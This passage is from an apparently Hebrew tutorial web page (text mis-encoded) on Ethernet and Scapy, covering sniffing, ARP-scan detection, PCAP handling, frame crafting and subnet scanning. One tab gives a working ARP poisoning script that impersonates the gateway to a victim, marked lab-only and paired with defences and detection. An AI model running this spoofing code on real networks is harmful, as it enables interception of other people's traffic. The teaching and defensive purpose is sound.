              <span class="kw">if</span> <span class="var">arp</span>.op <span class="op">==</span> <span class="num">1</span> <span class="kw">else</span>
              <span class="str">f"  [ARP] {arp.psrc} is at {arp.hwsrc}"</span>)

<span class="fn">sniff</span>(iface<span class="op">=</span><span class="str">"eth0"</span>, prn<span class="op">=</span><span class="fn">analyze_eth</span>, count<span class="op">=</span><span class="num">20</span>)

<span class="cm"># â”€â”€â”€ ×“×•×’××” 2: ×–×™×”×•×™ ARP Scanning â”€â”€â”€</span>
<span class="var">arp_counter</span> <span class="op">=</span> <span class="fn">defaultdict</span>(<span class="fn">int</span>)

<span class="kw">def</span> <span class="fn">detect_arp_scan</span>(pkt):
    <span class="kw">if</span> pkt.haslayer(<span class="fn">ARP</span>) <span class="kw">and</span> pkt[<span class="fn">ARP</span>].op <span class="op">==</span> <span class="num">1</span>:
        <span class="var">src</span> <span class="op">=</span> pkt[<span class="fn">ARP</span>].psrc
        <span class="var">arp_counter</span>[<span class="var">src</span>] <span class="op">+=</span> <span class="num">1</span>
        <span class="kw">if</span> <span class="var">arp_counter</span>[<span class="var">src</span>] <span class="op">&gt;</span> <span class="num">20</span>:
            <span class="fn">print</span>(<span class="str">f"âš  ARP Scan detected from {src}!"</span>
                  <span class="str">f" ({arp_counter[src]} requests)"</span>)

<span class="fn">sniff</span>(filter<span class="op">=</span><span class="str">"arp"</span>, prn<span class="op">=</span><span class="fn">detect_arp_scan</span>,
      store<span class="op">=</span><span class="kw">False</span>, iface<span class="op">=</span><span class="str">"eth0"</span>)

<span class="out">âš  ARP Scan detected from 192.168.1.200! (21 requests)
âš  ARP Scan detected from 192.168.1.200! (22 requests)</span></pre>
    </div>
  </div>

  <div id="sniff-pcap" class="tab-pane">
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” ×§×¨×™××ª / ×›×ª×™×‘×ª PCAP</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># â”€â”€â”€ ×§×¨×™××ª ×§×•×‘×¥ PCAP (×›××• ×-Wireshark) â”€â”€â”€</span>
<span class="var">pkts</span> <span class="op">=</span> <span class="fn">rdpcap</span>(<span class="str">"capture.pcap"</span>)
<span class="fn">print</span>(<span class="str">f"×¡×”"×› ××¡×’×¨×•×ª: {len(pkts)}"</span>)

<span class="cm"># â”€â”€â”€ × ×™×ª×•×— ×›×œ ××¡×’×¨×ª Ethernet â”€â”€â”€</span>
<span class="kw">for</span> <span class="var">i</span>, <span class="var">pkt</span> <span class="kw">in</span> <span class="fn">enumerate</span>(<span class="var">pkts</span>):
    <span class="kw">if</span> <span class="var">pkt</span>.haslayer(<span class="fn">Ether</span>):
        <span class="var">eth</span> <span class="op">=</span> <span class="var">pkt</span>[<span class="fn">Ether</span>]
        <span class="fn">print</span>(<span class="str">f"[{i}] {eth.src} â†’ {eth.dst}"</span>
              <span class="str">f" Type={hex(eth.type)} Len={len(pkt)}"</span>)

<span class="cm"># â”€â”€â”€ ×¡×™× ×•×Ÿ ××—×¨×™ ×”×§×¨×™××” â”€â”€â”€</span>
<span class="var">arp_only</span>  <span class="op">=</span> [p <span class="kw">for</span> p <span class="kw">in</span> <span class="var">pkts</span> <span class="kw">if</span> p.haslayer(<span class="fn">ARP</span>)]
<span class="var">large_pkts</span> <span class="op">=</span> [p <span class="kw">for</span> p <span class="kw">in</span> <span class="var">pkts</span> <span class="kw">if</span> <span class="fn">len</span>(p) <span class="op">&gt;</span> <span class="num">1000</span>]

<span class="cm"># â”€â”€â”€ ×¡×˜×˜×™×¡×˜×™×§×•×ª ×©×•×œ×—×™× â”€â”€â”€</span>
<span class="kw">from</span> <span class="op">collections</span> <span class="kw">import</span> <span class="op">Counter</span>
<span class="var">senders</span> <span class="op">=</span> <span class="fn">Counter</span>(
    p[<span class="fn">Ether</span>].src <span class="kw">for</span> p <span class="kw">in</span> <span class="var">pkts</span> <span class="kw">if</span> p.haslayer(<span class="fn">Ether</span>)
)
<span class="fn">print</span>(<span class="str">"Top senders:"</span>, <span class="var">senders</span>.most_common(<span class="num">5</span>))
<span class="out">Top senders: [('d8:bb:c1:7a:3f:2e', 342),
               ('00:11:32:ab:cd:ef', 128), ...]</span>

<span class="cm"># â”€â”€â”€ ×›×ª×™×‘×” ×œ-PCAP â”€â”€â”€</span>
<span class="fn">wrpcap</span>(<span class="str">"filtered_arp.pcap"</span>, <span class="var">arp_only</span>)</pre>
    </div>
  </div>

  <!-- SIMULATED SNIFF OUTPUT -->
  <hr class="sec-divider">
  <div class="reveal">
    <div class="sec-tag sec-tag-cyan" style="margin-bottom:12px;">// ×¤×œ×˜ ×œ×“×•×’××” â€” ×›×¤×™ ×©× ×¨××” ×‘-Terminal</div>
    <pre class="output-block">
<span class="ob-prompt">>>> </span><span style="color:var(--text)">sniff(iface="eth0", count=8, prn=lambda p: p.summary())</span>
<span class="ob-result">
</span><span class="ob-result">Ether / ARP </span><span class="ob-sep">who has </span><span class="ob-val">192.168.1.1</span><span class="ob-sep"> says </span><span class="ob-val">192.168.1.50</span>
<span class="ob-result">Ether / IP / TCP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep">:52300 > </span><span class="ob-val">142.250.74.46</span><span class="ob-sep">:443 SA</span>
<span class="ob-result">Ether / IP / UDP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep">:54312 > </span><span class="ob-val">8.8.8.8</span><span class="ob-sep">:53</span>
<span class="ob-result">Ether / ARP </span><span class="ob-val">192.168.1.1</span><span class="ob-sep"> is at </span><span class="ob-val">00:11:32:ab:cd:ef</span>
<span class="ob-result">Ether / IP / ICMP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep"> > </span><span class="ob-val">8.8.8.8</span><span class="ob-sep"> echo-request 0</span>
<span class="ob-result">Ether / IP / ICMP </span><span class="ob-val">8.8.8.8</span><span class="ob-sep"> > </span><span class="ob-val">192.168.1.50</span><span class="ob-sep"> echo-reply 0</span>
<span class="ob-result">Ether / IP / TCP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep">:52300 > </span><span class="ob-val">142.250.74.46</span><span class="ob-sep">:443 PA</span>
<span class="ob-result">Ether / IPv6 / ICMPv6 Neighbor Discovery</span>
<span class="ob-result">&lt;Sniffed: TCP:3 UDP:1 ICMP:2 ARP:2 Other:0&gt;</span>
    </pre>
  </div>
</section>

<!-- â”€â”€â”€ SEC 6: CRAFTING â”€â”€â”€ -->
<section class="section" id="sec-craft">
  <div class="sec-header">
    <div class="sec-tag sec-tag-orange">// Crafting</div>
    <h2 class="sec-h2">×™×¦×™×¨×ª ××¡×’×¨×•×ª <span style="color:var(--orange)">Ethernet</span></h2>
    <p class="sec-lead">Scapy ×××¤×©×¨×ª ×œ×‘× ×•×ª ×›×œ ××¡×’×¨×ª Ethernet ×™×“× ×™×ª â€” ×©×“×” ××—×¨ ×©×“×” â€” ×•×œ×©×œ×•×— ××•×ª×” ×œ×¨×©×ª. ×–×”×• ×”×›×œ×™ ×”××¨×›×–×™ ×œ××—×§×¨ ×¨×©×ª×•×ª ×•×‘×“×™×§×•×ª ×—×“×™×¨×”.</p>
  </div>

  <!-- CRAFTING TABS -->
  <div class="tabs-header">
    <button class="tab-btn active" onclick="switchTab('craft', 'eth-basic')">Ethernet ×‘×¡×™×¡×™</button>
    <button class="tab-btn" onclick="switchTab('craft', 'arp-craft')">ARP Packet</button>
    <button class="tab-btn" onclick="switchTab('craft', 'ping')">Ping (ICMP)</button>
    <button class="tab-btn" onclick="switchTab('craft', 'arp-poison')">ARP Poisoning</button>
  </div>

  <div id="craft-eth-basic" class="tab-pane active">
    <div class="two-col" style="gap:24px; align-items:start">
      <div>
        <div class="code-wrap">
          <div class="code-header">
            <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
            <span class="code-lang">python â€” ××¡×’×¨×ª Ethernet ×™×“× ×™×ª</span>
            <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
          </div>
          <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># â”€â”€â”€ ×‘× ×™×™×ª ××¡×’×¨×ª Ethernet â”€â”€â”€ </span>
<span class="var">frame</span> <span class="op">=</span> <span class="fn">Ether</span>(
    dst<span class="op">=</span><span class="mac">"00:11:22:33:44:55"</span>,  <span class="cm"># MAC ×™×¢×“</span>
    src<span class="op">=</span><span class="mac">"aa:bb:cc:dd:ee:ff"</span>,  <span class="cm"># MAC ××§×•×¨</span>
    type<span class="op">=</span><span class="hx">0x0800</span>               <span class="cm"># EtherType: IPv4</span>
)

<span class="cm"># â”€â”€â”€ ×”×•×¡×¤×ª IP + × ×ª×•× ×™× â”€â”€â”€</span>
<span class="var">pkt</span> <span class="op">=</span> <span class="var">frame</span> <span class="op">/</span> <span class="fn">IP</span>(
    src<span class="op">=</span><span class="ip">"10.0.0.1"</span>,
    dst<span class="op">=</span><span class="ip">"10.0.0.2"</span>,
    ttl<span class="op">=</span><span class="num">64</span>
) <span class="op">/</span> <span class="fn">Raw</span>(load<span class="op">=</span><span class="str">b"Hello Ethernet!"</span>)

<span class="cm"># â”€â”€â”€ ×”×¦×’×” â”€â”€â”€</span>
<span class="var">pkt</span>.show2()  <span class="cm"># show2 = ××—×•×©×‘ (×œ× auto)</span>

<span class="cm"># â”€â”€â”€ ×©×œ×™×—×” ×‘×©×›×‘×” 2 â”€â”€â”€</span>
<span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, verbose<span class="op">=</span><span class="kw">False</span>)

<span class="cm"># â”€â”€â”€ ×©×œ×™×—×” ××¨×•×‘×” â”€â”€â”€</span>
<span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>,
      count<span class="op">=</span><span class="num">5</span>, inter<span class="op">=</span><span class="num">0.5</span>)  <span class="cm"># 5 ×¤×¢××™×, ××¨×•×•×— 0.5s</span>

<span class="cm"># â”€â”€â”€ ×©××™×¨×” ×œ×§×•×‘×¥ â”€â”€â”€</span>
<span class="fn">wrpcap</span>(<span class="str">"my_frame.pcap"</span>, [<span class="var">pkt</span>])</pre>
        </div>
      </div>
      <div>
        <div class="info-card bc-orange">
          <div class="ic-title" style="color:var(--orange);">sendp() vs send()</div>
          <div class="ic-body mt8">
            <strong>sendp()</strong> â€” Layer 2: ×¦×¨×™×š ×œ×¦×™×™×Ÿ MAC. ×©×•×œ×— ××¡×’×¨×ª Ethernet ×™×©×™×¨×•×ª.<br><br>
            <strong>send()</strong> â€” Layer 3: ×¢×•×‘×“ ×¢× IP ×‘×œ×‘×“. ×”-OS ××•×¡×™×£ ××ª ×©×›×‘×ª Ethernet ××•×˜×•××˜×™×ª.<br><br>
            <strong>srp()</strong> â€” ×©×œ×— ×•×§×‘×œ ×ª×’×•×‘×” (Layer 2)<br>
            <strong>sr()</strong> â€” ×©×œ×— ×•×§×‘×œ ×ª×’×•×‘×” (Layer 3)
          </div>
        </div>
        <div class="code-wrap mt16">
          <div class="code-header">
            <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
            <span class="code-lang">// bytes ×’×•×œ××™×™×</span>
            <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
          </div>
          <pre><span class="cm"># ×’×™×©×” ×œ-bytes ×”×’×•×œ××™×™×</span>
<span class="var">raw</span> <span class="op">=</span> <span class="fn">bytes</span>(<span class="var">pkt</span>)
<span class="fn">print</span>(<span class="var">raw</span>.hex())
<span class="out">0011223344556aâ€¦</span>
<span class="cm">    ^dst MAC^src MAC^</span>

<span class="cm"># ×§×¨×™××” ×-bytes</span>
<span class="var">recovered</span> <span class="op">=</span> <span class="fn">Ether</span>(<span class="var">raw</span>)
<span class="var">recovered</span>.show()</pre>
        </div>
      </div>
    </div>
  </div>

  <div id="craft-arp-craft" class="tab-pane">
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” ×‘× ×™×™×ª ARP Request &amp; Reply</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># â”€â”€â”€ ARP Request: "××™ ×™×© ×œ×• 192.168.1.1?" â”€â”€â”€</span>
<span class="var">arp_req</span> <span class="op">=</span> <span class="fn">Ether</span>(
    dst<span class="op">=</span><span class="mac">"ff:ff:ff:ff:ff:ff"</span>   <span class="cm"># Broadcast!</span>
) <span class="op">/</span> <span class="fn">ARP</span>(
    op<span class="op">=</span><span class="num">1</span>,                     <span class="cm"># 1=request, 2=reply</span>
    hwsrc<span class="op">=</span><span class="mac">"aa:bb:cc:dd:ee:ff"</span>, <span class="cm"># MAC ×©×œ× ×•</span>
    psrc<span class="op">=</span><span class="ip">"192.168.1.50"</span>,      <span class="cm"># IP ×©×œ× ×•</span>
    hwdst<span class="op">=</span><span class="mac">"00:00:00:00:00:00"</span>, <span class="cm"># MAC ×™×¢×“ (×œ× ×™×“×•×¢)</span>
    pdst<span class="op">=</span><span class="ip">"192.168.1.1"</span>       <span class="cm"># IP ×©×× ×—× ×• ×©×•××œ×™× ×¢×œ×™×•</span>
)

<span class="cm"># ×©×œ×™×—×” + ×§×‘×œ×ª ×ª×©×•×‘×”</span>
<span class="var">ans</span>, <span class="var">unans</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">arp_req</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, timeout<span class="op">=</span><span class="num">2</span>)

<span class="kw">if</span> <span class="var">ans</span>:
    <span class="fn">print</span>(<span class="str">f"×”× ×ª×‘ × ××¦×: {ans[0][1][ARP].hwsrc}"</span>)
    <span class="out">×”× ×ª×‘ × ××¦×: 00:11:32:ab:cd:ef</span>

<span class="cm"># â”€â”€â”€ ARP Scan â€” ×¡×¨×™×§×ª ×›×œ ×”×¨×©×ª â”€â”€â”€</span>
<span class="var">scan_pkt</span> <span class="op">=</span> <span class="fn">Ether</span>(dst<span class="op">=</span><span class="mac">"ff:ff:ff:ff:ff:ff"</span>) <span class="op">/</span> \
           <span class="fn">ARP</span>(pdst<span class="op">=</span><span class="ip">"192.168.1.0/24"</span>)

<span class="var">alive</span>, <span class="var">_</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">scan_pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, timeout<span class="op">=</span><span class="num">3</span>)

<span class="fn">print</span>(<span class="str">"\n[+] ××—×©×‘×™× ×¤×¢×™×œ×™× ×‘×¨×©×ª:"</span>)
<span class="kw">for</span> <span class="var">snd</span>, <span class="var">rcv</span> <span class="kw">in</span> <span class="var">alive</span>:
    <span class="fn">print</span>(<span class="str">f"  IP: {rcv[ARP].psrc:20s}"</span>
          <span class="str">f"  MAC: {rcv[ARP].hwsrc}"</span>)

<span class="out">[+] ××—×©×‘×™× ×¤×¢×™×œ×™× ×‘×¨×©×ª:
  IP: 192.168.1.1           MAC: 00:11:32:ab:cd:ef
  IP: 192.168.1.50          MAC: d8:bb:c1:7a:3f:2e
  IP: 192.168.1.101         MAC: 3c:a9:f4:12:34:56</span></pre>
    </div>
  </div>

  <div id="craft-ping" class="tab-pane">
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” Ping (ICMP) + Ethernet</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># â”€â”€â”€ Ping ×¢× ×©×œ×™×˜×” ××œ××” ×¢×œ Ethernet â”€â”€â”€</span>
<span class="var">ping</span> <span class="op">=</span> <span class="fn">Ether</span>(
    dst<span class="op">=</span><span class="mac">"00:11:32:ab:cd:ef"</span>,  <span class="cm"># MAC ×©×œ ×”× ×ª×‘</span>
    src<span class="op">=</span><span class="mac">"d8:bb:c1:7a:3f:2e"</span>   <span class="cm"># MAC ×©×œ× ×•</span>
) <span class="op">/</span> <span class="fn">IP</span>(
    src<span class="op">=</span><span class="ip">"192.168.1.50"</span>,
    dst<span class="op">=</span><span class="ip">"8.8.8.8"</span>,
    ttl<span class="op">=</span><span class="num">64</span>
) <span class="op">/</span> <span class="fn">ICMP</span>(type<span class="op">=</span><span class="num">8</span>, code<span class="op">=</span><span class="num">0</span>, id<span class="op">=</span><span class="num">0x1234</span>, seq<span class="op">=</span><span class="num">1</span>) <span class="op">/</span> \
  <span class="str">b"Hello from Scapy!"</span>

<span class="cm"># ×©×œ×— ×•×§×‘×œ ×ª×©×•×‘×” (Layer 2)</span>
<span class="var">ans</span>, <span class="var">unans</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">ping</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, timeout<span class="op">=</span><span class="num">3</span>)

<span class="kw">for</span> <span class="var">snd</span>, <span class="var">rcv</span> <span class="kw">in</span> <span class="var">ans</span>:
    <span class="fn">print</span>(<span class="str">f"×ª×’×•×‘×” ×-{rcv[IP].src}"</span>
          <span class="str">f" | TTL={rcv[IP].ttl}"</span>
          <span class="str">f" | MAC={rcv[Ether].src}"</span>)
    <span class="out">×ª×’×•×‘×” ×-8.8.8.8 | TTL=118 | MAC=00:11:32:ab:cd:ef</span>

<span class="cm"># â”€â”€â”€ ×”×¦×’×ª ×”××¡×’×¨×ª ×©× ×©×œ×—×” â”€â”€â”€</span>
<span class="var">ping</span>.show()
<span class="out">###[ Ethernet ]###
  dst       = 00:11:32:ab:cd:ef
  src       = d8:bb:c1:7a:3f:2e
  type      = IPv4
###[ IP ]###
     src       = 192.168.1.50
     dst       = 8.8.8.8
     ttl       = 64
###[ ICMP ]###
        type      = echo-request
        id        = 0x1234
        seq       = 1
###[ Raw ]###
           load      = 'Hello from Scapy!'</span></pre>
    </div>
  </div>

  <div id="craft-arp-poison" class="tab-pane">
    <div class="callout ca-red">
      <div class="callout-icon">âš ï¸</div>
      <div class="callout-body">
        <strong>××–×”×¨×” â€” ×œ×¦×¨×›×™ ×œ×™××•×“ ×‘×œ×‘×“!</strong> ARP Poisoning ×”×™× ××ª×§×¤×” ×‘×œ×ª×™ ×—×•×§×™×ª ×¢×œ ×¨×©×ª×•×ª ×œ×œ× ×”×¨×©××”.
        ×”×“×•×’××” ×”×‘××” × ×•×¢×“×ª <strong>×œ×”×‘×™×Ÿ ××™×š ×”×”×’× ×” ×¢×•×‘×“×ª</strong> ×•×œ×–×”×•×ª ××ª ×”××ª×§×¤×”. ×™×© ×œ×”×©×ª××© <strong>×¨×§ ×‘×¡×‘×™×‘×ª lab ××‘×•×§×¨×ª</strong>.
      </div>
    </div>
    <div class="code-wrap mt16">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” ARP Poisoning (lab only!)</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
<span class="kw">import</span> <span class="op">time</span>

<span class="cm"># â”€â”€â”€ ×”×’×“×¨×•×ª â”€â”€â”€</span>
<span class="var">GATEWAY_IP</span>  <span class="op">=</span> <span class="ip">"192.168.1.1"</span>
<span class="var">VICTIM_IP</span>   <span class="op">=</span> <span class="ip">"192.168.1.100"</span>
<span class="var">VICTIM_MAC</span>  <span class="op">=</span> <span class="mac">"d8:bb:c1:7a:3f:2e"</span>  <span class="cm"># MAC ×”×××™×ª×™ ×©×œ ×”×§×•×¨×‘×Ÿ</span>
<span class="var">GATEWAY_MAC</span> <span class="op">=</span> <span class="mac">"00:11:32:ab:cd:ef"</span>  <span class="cm"># MAC ×”×××™×ª×™ ×©×œ ×”× ×ª×‘</span>

<span class="cm"># â”€â”€â”€ ×‘× ×™×™×ª ARP Reply ×›×•×–×‘ â”€â”€â”€</span>
<span class="cm"># ××•××¨×™× ×œ×§×•×¨×‘×Ÿ: "IP ×”× ×ª×‘ = MAC ×©×œ×™"</span>
<span class="kw">def</span> <span class="fn">poison_victim</span>():
    <span class="var">pkt</span> <span class="op">=</span> <span class="fn">Ether</span>(dst<span class="op">=</span><span class="var">VICTIM_MAC</span>) <span class="op">/</span> <span class="fn">ARP</span>(
        op<span class="op">=</span><span class="num">2</span>,               <span class="cm"># 2 = reply (×’× ×œ×œ× ×‘×§×©×”!)</span>
        hwsrc<span class="op">=</span><span class="fn">get_if_hwaddr</span>(<span class="str">"eth0"</span>),  <span class="cm"># MAC ×”×ª×•×§×£</span>
        psrc<span class="op">=</span><span class="var">GATEWAY_IP</span>,   <span class="cm"># ××ª×—×–×” ×œ× ×ª×‘!</span>
        hwdst<span class="op">=</span><span class="var">VICTIM_MAC</span>,
        pdst<span class="op">=</span><span class="var">VICTIM_IP</span>
    )
    <span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>, verbose<span class="op">=</span><span class="kw">False</span>)

<span class="cm"># â”€â”€â”€ ×©×—×–×•×¨ ×”×˜×‘×œ×” (Restore) â”€â”€â”€</span>
<span class="kw">def</span> <span class="fn">restore</span>():
    <span class="cm"># ××—×–×™×¨×™× ××ª ×”-ARP cache ×œ× ×›×•×Ÿ</span>
    <span class="fn">sendp</span>(<span class="fn">Ether</span>(dst<span class="op">=</span><span class="var">VICTIM_MAC</span>) <span class="op">/</span> <span class="fn">ARP</span>(
        op<span class="op">=</span><span class="num">2</span>,
        hwsrc<span class="op">=</span><span class="var">GATEWAY_MAC</span>,  <span class="cm"># â† MAC ×”×××™×ª×™</span>
        psrc<span class="op">=</span><span class="var">GATEWAY_IP</span>,
        hwdst<span class="op">=</span><span class="var">VICTIM_MAC</span>,
        pdst<span class="op">=</span><span class="var">VICTIM_IP</span>
    ), iface<span class="op">=</span><span class="str">"eth0"</span>, count<span class="op">=</span><span class="num">5</span>, verbose<span class="op">=</span><span class="kw">False</span>)

<span class="cm"># â”€â”€â”€ ×œ×•×œ××ª ×”×¨×¢×œ×” (×¢×¦×•×¨ ×¢× Ctrl+C) â”€â”€â”€</span>
<span class="kw">try</span>:
    <span class="kw">while</span> <span class="kw">True</span>:
        <span class="fn">poison_victim</span>()
        <span class="fn">time</span>.sleep(<span class="num">2</span>)        <span class="cm"># ×›×œ 2 ×©× ×™×•×ª</span>
<span class="kw">except</span> <span class="fn">KeyboardInterrupt</span>:
    <span class="fn">restore</span>()             <span class="cm"># ×©×—×–×¨ ×œ×¤× ×™ ×™×¦×™××”!</span>
    <span class="fn">print</span>(<span class="str">"[+] ARP table restored"</span>)</pre>
    </div>

    <div class="cards-grid cg-2 mt16">
      <div class="info-card bc-green">
        <div class="ic-icon">ğŸ›¡ï¸</div>
        <div class="ic-title" style="color:var(--green);">×”×’× ×•×ª ××¤× ×™ ARP Poisoning</div>
        <div class="ic-body">
          <strong>Dynamic ARP Inspection (DAI)</strong> â€” Switches ××‘×•×¡×¡×™ Cisco/HP ××××ª×™× ARP replies ××•×œ DHCP snooping table.<br><br>
          <strong>Static ARP entries</strong> â€” ×”×’×“×¨×ª ×™×“× ×™×ª ×©×œ MAC ×œ× ×ª×‘: <code>arp -s 192.168.1.1 00:11:32:ab:cd:ef</code><br><br>
          <strong>VLAN Segmentation</strong> â€” ×”×¤×¨×“×ª ×§×˜×¢×™ ×¨×©×ª ××¤×—×™×ª×” ××ª ×©×˜×— ×”×”×ª×§×¤×”.
        </div>
      </div>
      <div class="info-card bc-red">
        <div class="ic-icon">ğŸ”</div>
        <div class="ic-title" style="color:var(--red);">×–×™×”×•×™ ARP Poisoning</div>
        <div class="ic-body">
          <strong>arp -a</strong> â€” ×‘×“×™×§×” ×©×›×ª×•×‘×ª MAC ×©×œ ×”× ×ª×‘ ×œ× ×”×©×ª× ×ª×”.<br><br>
          <strong>Wireshark filter:</strong> <code>arp.duplicate-address-detected</code><br><br>
          <strong>XArp / ARP watch</strong> â€” ×›×œ×™× ×©××–×”×™×¨×™× ×¢×œ ×©×™× ×•×™ ARP cache.<br><br>
          <strong>Scapy detection:</strong> ×¨××” ×“×•×’××ª ×”×§×•×“ ×‘×œ×©×•× ×™×ª Sniffing.
        </div>
      </div>
    </div>
  </div>

  <!-- CHEATSHEET -->
  <hr class="sec-divider">
  <div class="reveal">
    <div class="sec-tag sec-tag-purple" style="margin-bottom:16px;">// Scapy Cheatsheet â€” Ethernet</div>
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” scapy ethernet cheatsheet</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#                 BUILDING FRAMES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span>
<span class="fn">Ether</span>()                        <span class="cm"># ××¡×’×¨×ª ×‘×¨×™×¨×ª ××—×“×œ</span>
<span class="fn">Ether</span>().show()                 <span class="cm"># ×”×¦×’ ×©×“×•×ª ×‘×¨×™×¨×ª ××—×“×œ</span>
<span class="fn">ls</span>(<span class="fn">Ether</span>)                      <span class="cm"># ×¨×©×™××ª ×›×œ ×©×“×•×ª Ether</span>

<span class="cm"># ×’×™×©×” ×œ×›×ª×•×‘×•×ª</span>
<span class="var">pkt</span>[<span class="fn">Ether</span>].dst                 <span class="cm"># MAC ×™×¢×“</span>
<span class="var">pkt</span>[<span class="fn">Ether</span>].src                 <span class="cm"># MAC ××§×•×¨</span>
<span class="var">pkt</span>[<span class="fn">Ether</span>].type                <span class="cm"># EtherType (×©×œ×)</span>

<span class="cm"># ×›×œ×™ ×¢×–×¨ ×œ-MAC</span>
<span class="fn">get_if_hwaddr</span>(<span class="str">"eth0"</span>)          <span class="cm"># MAC ×©×œ ×××©×§</span>
<span class="fn">getmacbyip</span>(<span class="ip">"192.168.1.1"</span>)     <span class="cm"># MAC ×œ×¤×™ IP (ARP)</span>

<span class="cm"># â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#                 SNIFFING
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span>
<span class="fn">sniff</span>(count<span class="op">=</span><span class="num">10</span>)                <span class="cm"># 10 ××¡×’×¨×•×ª</span>
<span class="fn">sniff</span>(filter<span class="op">=</span><span class="str">"arp"</span>)            <span class="cm"># ×¨×§ ARP</span>
<span class="fn">sniff</span>(iface<span class="op">=</span><span class="str">"eth0"</span>)           <span class="cm"># ×××©×§ ×¡×¤×¦×™×¤×™</span>
<span class="fn">sniff</span>(prn<span class="op">=</span><span class="kw">lambda</span> p: p.summary()) <span class="cm"># callback</span>

<span class="cm"># â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#                 SENDING
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span>
<span class="fn">sendp</span>(<span class="var">pkt</span>)                     <span class="cm"># ×©×œ×— L2</span>
<span class="fn">sendp</span>(<span class="var">pkt</span>, iface<span class="op">=</span><span class="str">"eth0"</span>)     <span class="cm"># ×××©×§ ×¡×¤×¦×™×¤×™</span>
<span class="fn">sendp</span>(<span class="var">pkt</span>, count<span class="op">=</span><span class="num">3</span>, inter<span class="op">=</span><span class="num">1</span>) <span class="cm"># 3 ×¤×¢××™×, ×›×œ ×©× ×™×”</span>
<span class="var">ans</span>,<span class="var">_</span> <span class="op">=</span> <span class="fn">srp</span>(<span class="var">pkt</span>, timeout<span class="op">=</span><span class="num">2</span>)  <span class="cm"># ×©×œ×— + ×§×‘×œ</span>

<span class="cm"># â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#                 FILES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span>
<span class="fn">wrpcap</span>(<span class="str">"out.pcap"</span>, <span class="var">pkts</span>)       <span class="cm"># ×©××•×¨ PCAP</span>
<span class="fn">rdpcap</span>(<span class="str">"cap.pcap"</span>)             <span class="cm"># ×§×¨× PCAP</span>

<span class="cm"># â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#                 ANALYSIS
